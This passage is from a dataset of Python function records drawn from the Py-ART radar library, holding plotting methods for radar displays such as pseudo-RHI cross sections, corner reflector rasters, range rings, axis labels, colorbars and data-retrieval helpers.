    if raster:
        pm.set_rasterized(True)
    if title_flag:
        self._set_vpt_title(field, title, ax)
    if axislabels_flag:
        self._label_axes_vpt(axislabels, time_axis_flag, ax)
    self.plots.append(pm)
    self.plot_vars.append(field)
    if colorbar_flag:
        self.plot_colorbar(mappable=pm, label=colorbar_label, orient=colorbar_orient, field=field, ax=ax, fig=fig, ticks=ticks, ticklabs=ticklabs)"
ARM-DOE/pyart,plot_azimuth_to_rhi,"def plot_azimuth_to_rhi(self, field, target_azimuth, mask_tuple=None, vmin=None, vmax=None, norm=None, cmap=None, mask_outside=False, title=None, title_flag=True, axislabels=(None, None), axislabels_flag=True, colorbar_flag=True, colorbar_label=None, colorbar_orient='vertical', edges=True, gatefilter=None, reverse_xaxis=None, filter_transitions=True, ax=None, fig=None, ticks=None, ticklabs=None, raster=False, **kwargs):
    """"""
        Plot pseudo-RHI scan by extracting the vertical field associated
        with the given azimuth.

        Additional arguments are passed to Matplotlib's pcolormesh function.

        Parameters
        ----------
        field : str
            Field to plot.
        target_azimuth : integer
            Azimuthal angle in degrees where cross section will be taken.

        Other Parameters
        ----------------
        mask_tuple : (str, float)
            2-Tuple containing the field name and value below which to mask
            field prior to plotting, for example to mask all data where
            NCP < 0.5 set mask to ['NCP', 0.5]. None performs no masking.
        vmin : float
            Luminance minimum value, None for default value.
            Parameter is ignored is norm is not None.
        vmax : float
            Luminance maximum value, None for default value.
            Parameter is ignored is norm is not None.
        norm : Normalize or None, optional
            matplotlib Normalize instance used to scale luminance data. If not
            None the vmax and vmin parameters are ignored. If None, vmin and
            vmax are used for luminance scaling.
        cmap : str or None
            Matplotlib colormap name. None will use the default colormap for
            the field being plotted as specified by the Py-ART configuration.
        title : str
            Title to label plot with, None to use default title generated from
            the field and sweep parameters. Parameter is ignored if title_flag
            is False.
        title_flag : bool
            True to add a title to the plot, False does not add a title.
        axislabels : (str, str)
            2-tuple of x-axis, y-axis labels. None for either label will use
            the default axis label. Parameter is ignored if axislabels_flag is
            False.
        axislabels_flag : bool
            True to add label the axes, False does not label the axes.
        reverse_xaxis : bool or None
            True to reverse the x-axis so the plot reads east to west, False
            to have east to west. None (the default) will reverse the axis
            only when all the distances are negative.
        colorbar_flag : bool
            True to add a colorbar with label to the axis. False leaves off
            the colorbar.
        colorbar_label : str
            Colorbar label, None will use a default label generated from the
            field information.
        ticks : array
            Colorbar custom tick label locations.
        ticklabs : array
            Colorbar custom tick labels.
        colorbar_orient : 'vertical' or 'horizontal'
            Colorbar orientation.
        edges : bool
            True will interpolate and extrapolate the gate edges from the
            range, azimuth and elevations in the radar, treating these
            as specifying the center of each gate. False treats these
            coordinates themselves as the gate edges, resulting in a plot
            in which the last gate in each ray and the entire last ray are not
            not plotted.
        gatefilter : GateFilter
            GateFilter instance. None will result in no gatefilter mask being
            applied to data.
        filter_transitions : bool
            True to remove rays where the antenna was in transition between
            sweeps from the plot. False will include these rays in the plot.
            No rays are filtered when the antenna_transition attribute of the
            underlying radar is not present.
        ax : Axis
            Axis to plot on. None will use the current axis.
        fig : Figure
            Figure to add the colorbar to. None will use the current figure.
        raster : bool
            False by default. Set to True to render the display as a raster
            rather than a vector in call to pcolormesh. Saves time in plotting
            high resolution data over large areas.  Be sure to set the dpi
            of the plot for your application if you save it as a vector format
            (i.e., pdf, eps, svg).

        """"""
    (ax, fig) = common.parse_ax_fig(ax, fig)
    (vmin, vmax) = common.parse_vmin_vmax(self._radar, field, vmin, vmax)
    cmap = common.parse_cmap(cmap, field)
    (data, x, y, z) = self._get_azimuth_rhi_data_x_y_z(field, target_azimuth, edges, mask_tuple, filter_transitions, gatefilter)
    data = _mask_outside(mask_outside, data, vmin, vmax)
    R = np.sqrt(x ** 2 + y ** 2) * np.sign(y)
    if reverse_xaxis is None:
        reverse_xaxis = np.all(R < 1.0)
    if reverse_xaxis:
        R = -R
    if norm is not None:
        vmin = vmax = None
    pm = ax.pcolormesh(R, z, data, vmin=vmin, vmax=vmax, cmap=cmap, norm=norm, **kwargs)
    if raster:
        pm.set_rasterized(True)
    if title_flag:
        self._set_az_rhi_title(field, target_azimuth, title, ax)
    if axislabels_flag:
        self._label_axes_rhi(axislabels, ax)
    self.plots.append(pm)
    self.plot_vars.append(field)
    if colorbar_flag:
        self.plot_colorbar(mappable=pm, label=colorbar_label, orient=colorbar_orient, field=field, ax=ax, fig=fig, ticks=ticks, ticklabs=ticklabs)"
ARM-DOE/pyart,plot_cr_raster,"def plot_cr_raster(self, field='reflectivity', target_range=None, ax=None, fig=None, delta_x=None, delta_y=None, az_limits=None, el_limits=None, vmin=None, vmax=None, cmap=None, title=None, title_flag=True, axislabels=[None, None], axislabels_flag=True, colorbar_flag=True, colorbar_label=None, colorbar_orient='vertical', ticks=None, ticklabs=None, raster=False):
    """"""
        Plot a corner reflector raster scan

        Parameters
        ----------
        field : String
            Field to plot if other than reflectivity
        target_range : Float
            Estimated range of the corner reflector

        Other Parameters
        ----------------
        ax : Axis
            Axis to plot on. None will use the current axis.
        fig : Figure
            Figure to add the colorbar to. None will use the current figure.
        delta_x : Float
            Azimuth grid spacing for griddata
        delta_y : Float
            Elevation grid spacing for griddata
        az_limits : list
            Azimuth limits in form [min, max]
        el_limits : list
            Elevation limits in form [min, max]
        vmin : float
            Luminance minimum value, None for default value.
            Parameter is ignored is norm is not None.
        vmax : float
            Luminance maximum value, None for default value.
            Parameter is ignored is norm is not None.
        cmap : str or None
            Matplotlib colormap name. None will use the default colormap for
            the field being plotted as specified by the Py-ART configuration.
        title : str
            Title to label plot with, None to use default title generated from
            the field and sweep parameters. Parameter is ignored if title_flag
            is False.
        title_flag : bool
            True to add a title to the plot, False does not add a title.
        axislabels : (str, str)
            2-tuple of x-axis, y-axis labels. None for either label will use
            the default axis label. Parameter is ignored if axislabels_flag is
            False.
        axislabels_flag : bool
            True to add label the axes, False does not label the axes.
        colorbar_flag : bool
            True to add a colorbar with label to the axis. False leaves off
            the colorbar.
        colorbar_label : str
            Colorbar label, None will use a default label generated from the
            field information.
        ticks : array
            Colorbar custom tick label locations.
        ticklabs : array
            Colorbar custom tick labels.
        colorbar_orient : 'vertical' or 'horizontal'
            Colorbar orientation.
        raster : bool
            False by default. Set to True to render the display as a raster
            rather than a vector in call to pcolormesh. Saves time in plotting
            high resolution data over large areas.  Be sure to set the dpi
            of the plot for your application if you save it as a vector format
            (i.e., pdf, eps, svg).

        """"""
    (ax, fig) = common.parse_ax_fig(ax, fig)
    az = self._radar.azimuth['data']
    el = self._radar.elevation['data']
    if el[0] is None:
        raise ValueError('Elevation is set to None. CR raster plotting is unavailable for this dataset. Elevation can be set to None due to not being present per Halfword 30 Table V of the ICD for NEXRAD level 3 data.')
    rng = self._radar.range['data']
    data = self._radar.fields[field]['data']
    if az_limits is None:
        min_az = np.nanmin(az)
        max_az = np.nanmax(az)
    else:
        min_az = az_limits[0]
        max_az = az_limits[1]
    if el_limits is None:
        min_el = np.nanmin(el)
        max_el = np.nanmax(el)
    else:
        min_el = el_limits[0]
        max_el = el_limits[1]
    if delta_x is None:
        delta_x = max_az - min_az
    if delta_y is None:
        delta_y = max_el - min_el
    if target_range is None:
        target_index = 0
    else:
        target_index = np.argmin(np.abs(np.array(rng) - target_range))
    data = data[:, target_index]
    (xi, yi) = np.meshgrid(np.linspace(min_az, max_az, int(delta_x / 0.01)), np.linspace(min_el, max_el, int(delta_y / 0.01)))
    grid = griddata((az, el), data, (xi, yi), method='linear')
    pm = ax.pcolormesh(xi[0, :], yi[:, 0], grid, vmin=vmin, vmax=vmax, cmap=cmap)
    if title_flag is True:
        if title is None:
            time_str = common.generate_radar_time_begin(self._radar)
            title = ' '.join(['Corner Reflector', field.title(), time_str.strftime('%m/%d/%Y %H:%M:%S')])
        ax.set_title(title)
    if axislabels_flag is True:
        if axislabels[0] is None:
            axislabels[0] = 'Azimuth (deg)'
        if axislabels[1] is None:
            axislabels[1] = 'Elevation (deg)'
        ax.set_xlabel(axislabels[0])
        ax.set_ylabel(axislabels[1])
    if raster:
        pm.set_rasterized(True)
    self.plots.append(pm)
    self.plot_vars.append(field)
    if colorbar_flag:
        self.plot_colorbar(mappable=pm, label=colorbar_label, orient=colorbar_orient, field=field, ax=ax, fig=fig, ticks=ticks, ticklabs=ticklabs)"
ARM-DOE/pyart,plot_range_rings,"def plot_range_rings(self, range_rings, ax=None, col='k', ls='-', lw=2):
    """"""
        Plot a series of range rings.

        Parameters
        ----------
        range_rings : list
            List of locations in km to draw range rings.
        ax : Axis
            Axis to plot on. None will use the current axis.
        col : str or value
            Color to use for range rings.
        ls : str
            Linestyle to use for range rings.

        """"""
    for range_ring_location_km in range_rings:
        self.plot_range_ring(range_ring_location_km, ax=ax, col=col, ls=ls, lw=lw)"
ARM-DOE/pyart,plot_range_ring,"@staticmethod
def plot_range_ring(range_ring_location_km, npts=100, ax=None, col='k', ls='-', lw=2):
    """"""
        Plot a single range ring.

        Parameters
        ----------
        range_ring_location_km : float
            Location of range ring in km.
        npts: int
            Number of points in the ring, higher for better resolution.
        ax : Axis
            Axis to plot on. None will use the current axis.
        col : str or value
            Color to use for range rings.
        ls : str
            Linestyle to use for range rings.

        """"""
    ax = common.parse_ax(ax)
    theta = np.linspace(0, 2 * np.pi, npts)
    r = np.ones([npts], dtype=np.float32) * range_ring_location_km
    x = r * np.sin(theta)
    y = r * np.cos(theta)
    ax.plot(x, y, c=col, ls=ls, lw=lw)"
ARM-DOE/pyart,plot_grid_lines,"@staticmethod
def plot_grid_lines(ax=None, col='k', ls=':'):
    """"""
        Plot grid lines.

        Parameters
        ----------
        ax : Axis
            Axis to plot on. None will use the current axis.
        col : str or value
            Color to use for grid lines.
        ls : str
            Linestyle to use for grid lines.

        """"""
    ax = common.parse_ax(ax)
    ax.grid(c=col, ls=ls)"
ARM-DOE/pyart,plot_labels,"def plot_labels(self, labels, locations, symbols='r+', text_color='k', ax=None):
    """"""
        Plot symbols and labels at given locations.

        Parameters
        ----------
        labels : list of str
            List of labels to place just above symbols.
        locations : list of 2-tuples
            List of latitude, longitude (in degrees) tuples at which symbols
            will be place. Labels are placed just above the symbols.
        symbols : list of str or str
            List of matplotlib color+marker strings defining symbols to place
            at given locations. If a single string is provided, that symbol
            will be placed at all locations.
        text_color : str
            Matplotlib color defining the color of the label text.
        ax : Axis
            Axis to plot on. None will use the current axis.

        """"""
    ax = common.parse_ax(ax)
    if isinstance(symbols, str):
        symbols = [symbols] * len(labels)
    if len(labels) != len(locations):
        raise ValueError('length of labels and locations must match')
    if len(labels) != len(symbols):
        raise ValueError('length of labels and symbols must match')
    for (loc, label, sym) in zip(locations, labels, symbols):
        self.plot_label(label, loc, sym, text_color, ax)"
ARM-DOE/pyart,plot_label,"def plot_label(self, label, location, symbol='r+', text_color='k', ax=None):
    """"""
        Plot a single symbol and label at a given location.

        Transforms of the symbol location in latitude and longitude units to
        x and y plot units is performed using an azimuthal equidistance
        map projection centered at the radar.

        Parameters
        ----------
        label : str
            Label text to place just above symbol.
        location : 2-tuples
            Tuple of latitude, longitude (in degrees) at which the symbol
            will be place. The label is placed just above the symbol.
        symbol : str
            Matplotlib color+marker strings defining the symbol to place
            at the given location.
        text_color : str
            Matplotlib color defining the color of the label text.
        ax : Axis
            Axis to plot on. None will use the current axis.

        """"""
    ax = common.parse_ax(ax)
    (location_lat, location_lon) = location
    (radar_lat, radar_lon) = self.loc
    (location_x, location_y) = geographic_to_cartesian_aeqd(location_lon, location_lat, radar_lon, radar_lat)
    location_x /= 1000.0
    location_y /= 1000.0
    ax.plot([location_x], [location_y], symbol)
    ax.text(location_x - 5.0, location_y, label, color=text_color)"
ARM-DOE/pyart,plot_cross_hair,"@staticmethod
def plot_cross_hair(size, npts=100, ax=None):
    """"""
        Plot a cross-hair on a ppi plot.

        Parameters
        ----------
        size : float
            Size of cross-hair in km.
        npts: int
            Number of points in the cross-hair, higher for better resolution.
        ax : Axis
            Axis to plot on. None will use the current axis.

        """"""
    ax = common.parse_ax(ax)
    x = np.zeros(npts, dtype=np.float32)
    y = np.linspace(-size, size, npts)
    ax.plot(x, y, 'k-')
    ax.plot(y, x, 'k-')"
ARM-DOE/pyart,plot_colorbar,"def plot_colorbar(self, mappable=None, field=None, label=None, orient='vertical', cax=None, ax=None, fig=None, ticks=None, ticklabs=None, **kwargs):
    """"""
        Plot a colorbar.

        Parameters
        ----------
        mappable : Image, ContourSet, etc.
            Image, ContourSet, etc to which the colorbar applied. If None the
            last mappable object will be used.
        field : str
            Field to label colorbar with.
        label : str
            Colorbar label. None will use a default value from the last field
            plotted.
        orient : str
            Colorbar orientation, either 'vertical' [default] or 'horizontal'.
        cax : Axis
            Axis onto which the colorbar will be drawn. None is also valid.
        ax : Axes
            Axis onto which the colorbar will be drawn. None is also valid.
        fig : Figure
            Figure to place colorbar on. None will use the current figure.
        ticks : array
            Colorbar custom tick label locations.
        ticklabs : array
            Colorbar custom tick labels.
        """"""
    if fig is None:
        fig = plt.gcf()
    if mappable is None:
        mappable = self.plots[-1]
    if label is None:
        if field is None:
            field = self.plot_vars[-1]
        label = self._get_colorbar_label(field)
    cb = fig.colorbar(mappable, orientation=orient, ax=ax, cax=cax, **kwargs)
    if ticks is not None:
        cb.set_ticks(ticks)
    if ticklabs:
        cb.set_ticklabels(ticklabs)
    cb.set_label(label)
    self.cbs.append(cb)"
ARM-DOE/pyart,set_limits,"@staticmethod
def set_limits(xlim=None, ylim=None, ax=None):
    """"""
        Set the display limits.

        Parameters
        ----------
        xlim : tuple, optional
            2-Tuple containing y-axis limits in km. None uses default limits.
        ylim : tuple, optional
            2-Tuple containing x-axis limits in km. None uses default limits.
        ax : Axis
            Axis to adjust. None will adjust the current axis.

        """"""
    common.set_limits(xlim, ylim, ax)"
ARM-DOE/pyart,label_xaxis_x,"def label_xaxis_x(self, ax=None):
    """"""Label the xaxis with the default label for x units.""""""
    ax = common.parse_ax(ax)
    ax.set_xlabel('East West distance from ' + self.origin + ' (km)')"
ARM-DOE/pyart,label_yaxis_y,"def label_yaxis_y(self, ax=None):
    """"""Label the yaxis with the default label for y units.""""""
    ax = common.parse_ax(ax)
    ax.set_ylabel('North South distance from ' + self.origin + ' (km)')"
ARM-DOE/pyart,label_xaxis_r,"def label_xaxis_r(self, ax=None):
    """"""Label the xaxis with the default label for r units.""""""
    ax = common.parse_ax(ax)
    ax.set_xlabel('Distance from ' + self.origin + ' (km)')"
ARM-DOE/pyart,label_yaxis_z,"def label_yaxis_z(self, ax=None):
    """"""Label the yaxis with the default label for z units.""""""
    ax = common.parse_ax(ax)
    ax.set_ylabel('Distance Above ' + self.origin + '  (km)')"
ARM-DOE/pyart,label_xaxis_rays,"@staticmethod
def label_xaxis_rays(ax=None):
    """"""Label the yaxis with the default label for rays.""""""
    ax = common.parse_ax(ax)
    ax.set_xlabel('Ray number (unitless)')"
ARM-DOE/pyart,label_xaxis_time,"@staticmethod
def label_xaxis_time(ax=None):
    """"""Label the yaxis with the default label for rays.""""""
    ax = common.parse_ax(ax)
    ax.set_xlabel('Time (HH:MM)')"
ARM-DOE/pyart,label_yaxis_field,"def label_yaxis_field(self, field, ax=None):
    """"""Label the yaxis with the default label for a field units.""""""
    ax = common.parse_ax(ax)
    ax.set_ylabel(self._get_colorbar_label(field))"
ARM-DOE/pyart,set_aspect_ratio,"@staticmethod
def set_aspect_ratio(aspect_ratio=0.75, ax=None):
    """"""Set the aspect ratio for plot area.""""""
    ax = common.parse_ax(ax)
    ax.set_aspect(aspect_ratio)"
ARM-DOE/pyart,_set_title,"def _set_title(self, field, sweep, title, ax, datetime_format=None, use_sweep_time=True):
    """"""Set the figure title using a default title.""""""
    if title is None:
        ax.set_title(self.generate_title(field, sweep, datetime_format, use_sweep_time))
    else:
        ax.set_title(title)"
ARM-DOE/pyart,_set_vpt_title,"def _set_vpt_title(self, field, title, ax):
    """"""Set the figure title using a default title.""""""
    if title is None:
        ax.set_title(self.generate_vpt_title(field))
    else:
        ax.set_title(title)"
ARM-DOE/pyart,_set_ray_title,"def _set_ray_title(self, field, ray, title, ax):
    """"""Set the figure title for a ray plot using a default title.""""""
    if title is None:
        ax.set_title(self.generate_ray_title(field, ray))
    else:
        ax.set_title(title)"
ARM-DOE/pyart,_set_az_rhi_title,"def _set_az_rhi_title(self, field, azimuth, title, ax):
    """"""Set the figure title for a ray plot using a default title.""""""
    if title is None:
        ax.set_title(self.generate_az_rhi_title(field, azimuth))
    else:
        ax.set_title(title)"
ARM-DOE/pyart,_label_axes_ppi,"def _label_axes_ppi(self, axis_labels, ax):
    """"""Set the x and y axis labels for a PPI plot.""""""
    (x_label, y_label) = axis_labels
    if x_label is None:
        self.label_xaxis_x(ax)
    else:
        ax.set_xlabel(x_label)
    if y_label is None:
        self.label_yaxis_y(ax)
    else:
        ax.set_ylabel(y_label)"
ARM-DOE/pyart,_label_axes_rhi,"def _label_axes_rhi(self, axis_labels, ax):
    """"""Set the x and y axis labels for a RHI plot.""""""
    (x_label, y_label) = axis_labels
    if x_label is None:
        self.label_xaxis_r(ax)
    else:
        ax.set_xlabel(x_label)
    if y_label is None:
        self.label_yaxis_z(ax)
    else:
        ax.set_ylabel(y_label)"
ARM-DOE/pyart,_label_axes_ray,"def _label_axes_ray(self, axis_labels, field, ax):
    """"""Set the x and y axis labels for a ray plot.""""""
    (x_label, y_label) = axis_labels
    if x_label is None:
        self.label_xaxis_r(ax)
    else:
        ax.set_xlabel(x_label)
    if y_label is None:
        self.label_yaxis_field(field, ax)
    else:
        ax.set_ylabel(y_label)"
ARM-DOE/pyart,_label_axes_vpt,"def _label_axes_vpt(self, axis_labels, time_axis_flag, ax):
    """"""Set the x and y axis labels for a PPI plot.""""""
    (x_label, y_label) = axis_labels
    if x_label is None:
        if time_axis_flag:
            self.label_xaxis_time(ax)
        else:
            self.label_xaxis_rays(ax)
    else:
        ax.set_xlabel(x_label)
    if y_label is None:
        self.label_yaxis_z(ax)
    else:
        ax.set_ylabel(y_label)"
ARM-DOE/pyart,_set_vpt_time_axis,"@staticmethod
def _set_vpt_time_axis(ax, date_time_form=None, tz=None):
    """"""
        Set the x axis as a time formatted axis.

        Parameters
        ----------
        ax : Matplotlib axis instance
            Axis to plot. None will use the current axis.
        date_time_form : str
            Format of the time string for x-axis labels.
        tz : str
            Time zone info to use when creating axis labels (see datetime).

        """"""
    if date_time_form is None:
        date_time_form = '%H:%M'
    date_Fmt = DateFormatter(date_time_form, tz=tz)
    ax.xaxis.set_major_formatter(date_Fmt)
    ax.tick_params(which='both', direction='out')"
ARM-DOE/pyart,generate_filename,"def generate_filename(self, field, sweep, ext='png', datetime_format='%Y%m%d%H%M%S', use_sweep_time=False):
    """"""
        Generate a filename for a plot.

        Generated filename has form:
            radar_name_field_sweep_time.ext

        Parameters
        ----------
        field : str
            Field plotted.
        sweep : int
            Sweep plotted.
        ext : str
            Filename extension.
        datetime_format : str
            Format of datetime (using strftime format).
        use_sweep_time : bool
            If true, the current sweep's beginning time is used.

        Returns
        -------
        filename : str
            Filename suitable for saving a plot.

        """"""
    return common.generate_filename(self._radar, field, sweep, ext, datetime_format, use_sweep_time)"
ARM-DOE/pyart,generate_title,"def generate_title(self, field, sweep, datetime_format=None, use_sweep_time=True):
    """"""
        Generate a title for a plot.

        Parameters
        ----------
        field : str
            Field plotted.
        sweep : int
            Sweep plotted.
        datetime_format : str
            Format of datetime (using strftime format).
        use_sweep_time : bool
            If true, the current sweep's beginning time is used.

        Returns
        -------
        title : str
            Plot title.

        """"""
    return common.generate_title(self._radar, field, sweep, datetime_format, use_sweep_time)"
ARM-DOE/pyart,generate_vpt_title,"def generate_vpt_title(self, field):
    """"""
        Generate a title for a VPT plot.

        Parameters
        ----------
        field : str
            Field plotted.

        Returns
        -------
        title : str
            Plot title.

        """"""
    return common.generate_vpt_title(self._radar, field)"
ARM-DOE/pyart,generate_ray_title,"def generate_ray_title(self, field, ray):
    """"""
        Generate a title for a ray plot.

        Parameters
        ----------
        field : str
            Field plotted.
        ray : int
            Ray plotted.

        Returns
        -------
        title : str
            Plot title.

        """"""
    return common.generate_ray_title(self._radar, field, ray)"
ARM-DOE/pyart,generate_az_rhi_title,"def generate_az_rhi_title(self, field, azimuth):
    """"""
        Generate a title for a ray plot.

        Parameters
        ----------
        field : str
            Field plotted.
        azimuth : float
            Azimuth plotted.

        Returns
        -------
        title : str
            Plot title.

        """"""
    return common.generate_az_rhi_title(self._radar, field, azimuth)"
ARM-DOE/pyart,_get_data,"def _get_data(self, field, sweep, mask_tuple, filter_transitions, gatefilter):
    """"""Retrieve and return data from a plot function.""""""
    sweep_slice = self._radar.get_slice(sweep)
    data = self.fields[field]['data'][sweep_slice]
    if mask_tuple is not None:
        (mask_field, mask_value) = mask_tuple
        mdata = self.fields[mask_field]['data'][sweep_slice]
        data = np.ma.masked_where(mdata < mask_value, data)
    if gatefilter is not None:
        mask_filter = gatefilter.gate_excluded[sweep_slice]
        data = np.ma.masked_array(data, mask_filter)
    if filter_transitions and self.antenna_transition is not None:
        in_trans = self.antenna_transition[sweep_slice]
        data = data[in_trans != 1]
    return data"
ARM-DOE/pyart,_get_vpt_data,"def _get_vpt_data(self, field, mask_tuple, filter_transitions, gatefilter):
    """"""Retrieve and return vpt data from a plot function.""""""
    data = self.fields[field]['data']
    if mask_tuple is not None:
        (mask_field, mask_value) = mask_tuple
        mdata = self.fields[mask_field]['data']
        data = np.ma.masked_where(mdata < mask_value, data)
    if gatefilter is not None:
        mask_filter = gatefilter.gate_excluded
        data = np.ma.masked_array(data, mask_filter)
    if filter_transitions and self.antenna_transition is not None:
        in_trans = self.antenna_transition
        data = data[in_trans != 1]
    return data.T"
ARM-DOE/pyart,_get_ray_data,"def _get_ray_data(self, field, ray, mask_tuple, gatefilter):
    """"""Retrieve and return ray data from a plot function.""""""
    data = self.fields[field]['data'][ray]
    if mask_tuple is not None:
        (mask_field, mask_value) = mask_tuple
        mdata = self.fields[mask_field]['data'][ray]
        data = np.ma.masked_where(mdata < mask_value, data)
    if gatefilter is not None:
        mask_filter = gatefilter.gate_excluded[ray]
        data = np.ma.masked_array(data, mask_filter)
    return data"
ARM-DOE/pyart,_get_azimuth_rhi_data_x_y_z,"def _get_azimuth_rhi_data_x_y_z(self, field, target_azimuth, edges, mask_tuple, filter_transitions, gatefilter):
    """"""Retrieve and return pseudo-RHI data from a plot function.""""""
    data = self.fields[field]['data']
    if mask_tuple is not None:
        (mask_field, mask_value) = mask_tuple
        mdata = self.fields[mask_field]['data']
        data = np.ma.masked_where(mdata < mask_value, data)
    if gatefilter is not None:
        mask_filter = gatefilter.gate_excluded
        data = np.ma.masked_array(data, mask_filter)
    if filter_transitions and self.antenna_transition is not None:
        in_trans = self.antenna_transition
        data = data[in_trans == 0]
    prhi_rays = []
    for sweep_slice in self._radar.iter_slice():
        sweep_azimuths = self.azimuths[sweep_slice]
        ray_number = np.argmin(np.abs(sweep_azimuths - target_azimuth))
        prhi_rays.append(ray_number + sweep_slice.start)
    azimuth = self.azimuths[prhi_rays]
    if self.elevations[0] is None:
        raise ValueError('Elevation is set to None. RHI plotting is unavailable for this dataset. Elevation can be set to None due to not being present per Halfword 30 Table V of the ICD for NEXRAD level 3 data.')
    elevation = self.elevations[prhi_rays]
    data = data[prhi_rays]
    rng = self.ranges
    if edges and len(prhi_rays) == 1:
        rng = self.ranges[:-1]
    (x, y, z) = antenna_vectors_to_cartesian(rng, azimuth, elevation, edges=edges)
    x = (x + self.shift[0]) / 1000.0
    y = (y + self.shift[1]) / 1000.0
    z = z / 1000.0
    return (data, x, y, z)"
ARM-DOE/pyart,_get_x_z,"def _get_x_z(self, sweep, edges, filter_transitions):
    """"""Retrieve and return x and z coordinate in km.""""""
    (x, _, z) = self._get_x_y_z(sweep, edges, filter_transitions)
    return (x, z)"
ARM-DOE/pyart,_get_x_y,"def _get_x_y(self, sweep, edges, filter_transitions):
    """"""Retrieve and return x and y coordinate in km.""""""
    (x, y, _) = self._get_x_y_z(sweep, edges, filter_transitions)
    return (x, y)"
ARM-DOE/pyart,_get_x_y_z,"def _get_x_y_z(self, sweep, edges, filter_transitions):
    """"""Retrieve and return x, y, and z coordinate in km.""""""
    (x, y, z) = self._radar.get_gate_x_y_z(sweep, edges=edges, filter_transitions=filter_transitions)
    x = (x + self.shift[0]) / 1000.0
    y = (y + self.shift[1]) / 1000.0
    z = z / 1000.0
    return (x, y, z)"
ARM-DOE/pyart,_get_colorbar_label,"def _get_colorbar_label(self, field):
    """"""Return a colorbar label for a given field.""""""
    last_field_dict = self.fields[field]
    if 'standard_name' in last_field_dict:
        standard_name = last_field_dict['standard_name']
    elif 'long_name' in last_field_dict:
        standard_name = last_field_dict['long_name']
    else:
        standard_name = field
    if 'units' in last_field_dict:
        units = last_field_dict['units']
    else:
        units = '?'
    return common.generate_colorbar_label(standard_name, units)"
ARM-DOE/pyart,__init__,"def __init__(self, radar, shift=(0.0, 0.0)):
    """"""Initialize the object.""""""
    self.fixed_angle = radar.fixed_angle['data'][0]
    self.rotation = radar.rotation['data']
    self.roll = radar.roll['data']
    self.drift = radar.drift['data']
    self.tilt = radar.tilt['data']
    self.heading = radar.heading['data']
    self.pitch = radar.pitch['data']
    self.altitude = radar.altitude['data']
    super().__init__(radar, shift)
    middle_lat = int(radar.latitude['data'].shape[0] / 2)
    middle_lon = int(radar.longitude['data'].shape[0] / 2)
    lat = float(radar.latitude['data'][middle_lat])
    lon = float(radar.longitude['data'][middle_lon])
    self.loc = (lat, lon)"
ARM-DOE/pyart,plot,"def plot(self, field, sweep=0, **kwargs):
    """"""
        Create a plot appropiate for the radar.

        This function calls the plotting function corresponding to
        the scan_type of the radar. Additional keywords can be passed to
        customize the plot, see the appropiate plot function for the
        allowed keywords.

        Parameters
        ----------
        field : str
            Field to plot.
        sweep : int
            Sweep number to plot, not used for VPT scans.

        See Also
        --------
        plot_ppi : Plot a PPI scan
        plot_sweep_grid : Plot a RHI or VPT scan

        """"""
    if self.scan_type == 'ppi':
        self.plot_ppi(field, sweep, **kwargs)
    elif self.scan_type == 'rhi':
        self.plot_sweep_grid(field, sweep, **kwargs)
    elif self.scan_type == 'vpt':
        self.plot_sweep_grid(field, sweep, **kwargs)
    else:
        raise ValueError('unknown scan_type % s' % self.scan_type)
    return"
ARM-DOE/pyart,plot_sweep_grid,"def plot_sweep_grid(self, field, sweep=0, ignoreTilt=False, mask_tuple=None, vmin=None, vmax=None, cmap=None, norm=None, mask_outside=False, title=None, title_flag=True, axislabels=(None, None), axislabels_flag=True, colorbar_flag=True, colorbar_label=None, colorbar_orient='vertical', edges=True, filter_transitions=True, ax=None, fig=None, gatefilter=None, raster=False, ticks=None, ticklabs=None, **kwargs):
    """"""
        Plot a sweep as a grid.

        Additional arguments are passed to Matplotlib's pcolormesh function.

        Parameters
        ----------
        field : str
            Field to plot.
        sweep : int, optional
            Sweep number to plot.

        Other Parameters
        ----------------
        ignoreTilt : bool
            True to ignore tilt angle when running the
            antenna_to_cartesian_track_relative coordinate transformation (by
            setting tilt angle to 0), effectively plotting data relative to
            slant range (the same plotting method utilized by the NCAR
            soloii/3 software). False (default) plots relative to the aircraft
            longitudinal axis.
        mask_tuple : (str, float)
            Tuple containing the field name and value below which to mask
            field prior to plotting, for example to mask all data where
            NCP < 0.5 set mask_tuple to ['NCP', 0.5]. None performs no masking.
        vmin : float
            Luminance minimum value, None for default value.
            Parameter is ignored is norm is not None.
        vmax : float
            Luminance maximum value, None for default value.
            Parameter is ignored is norm is not None.
        norm : Normalize or None, optional
            matplotlib Normalize instance used to scale luminance data. If not
            None the vmax and vmin parameters are ignored. If None, vmin and
            vmax are used for luminance scaling.
        cmap : str or None
            Matplotlib colormap name. None will use the default colormap for
            the field being plotted as specified by the Py-ART configuration.
        mask_outside : bool
            True to mask data outside of vmin, vmax. False performs no
            masking.
        title : str
            Title to label plot with, None to use default title generated from
            the field and sweep parameters. Parameter is ignored if title_flag
            is False.
        title_flag : bool
            True to add a title to the plot, False does not add a title.
        axislabels : (str, str)
            2-tuple of x-axis, y-axis labels. None for either label will use
            the default axis label. Parameter is ignored if axislabels_flag is
            False.
        axislabels_flag : bool
            True to add label the axes, False does not label the axes.
        colorbar_flag : bool
            True to add a colorbar with label to the axis. False leaves off
            the colorbar.
        colorbar_label : str
            Colorbar label, None will use a default label generated from the
            field information.
        colorbar_orient : 'vertical' or 'horizontal'
            Colorbar orientation.
        edges : bool
            True will interpolate and extrapolate the gate edges from the
            range, azimuth and elevations in the radar, treating these
            as specifying the center of each gate. False treats these
            coordinates themselved as the gate edges, resulting in a plot
            in which the last gate in each ray and the entire last ray are not
            plotted.
        gatefilter : GateFilter
            GateFilter instance. None will result in no gatefilter mask being
            applied to data.
        filter_transitions : bool
            True to remove rays where the antenna was in transition between
            sweeps from the plot. False will include these rays in the plot.
            No rays are filtered when the antenna_transition attribute of the
            underlying radar is not present.
        ax : Axis
            Axis to plot on. None will use the current axis.
        fig : Figure
            Figure to add the colorbar to. None will use the current figure.
        raster : bool
            False by default. Set to true to render the display as a raster
            rather than a vector in call to pcolormesh. Saves time in plotting
            high resolution data over large areas. Be sure to set the dpi
            of the plot for your application if you save it as a vector format
            (i.e., pdf, eps, svg).
        ticks : array
            Colorbar custom tick label locations.
        ticklabs : array
            Colorbar custom tick labels.

        """"""
    (ax, fig) = common.parse_ax_fig(ax, fig)
    (vmin, vmax) = common.parse_vmin_vmax(self._radar, field, vmin, vmax)
    cmap = common.parse_cmap(cmap, field)
    data = self._get_data(field, sweep, mask_tuple, filter_transitions, gatefilter)
    (x, z) = self._get_x_z(sweep, edges, filter_transitions, ignoreTilt=ignoreTilt)
    if mask_outside:
        data = np.ma.masked_invalid(data)
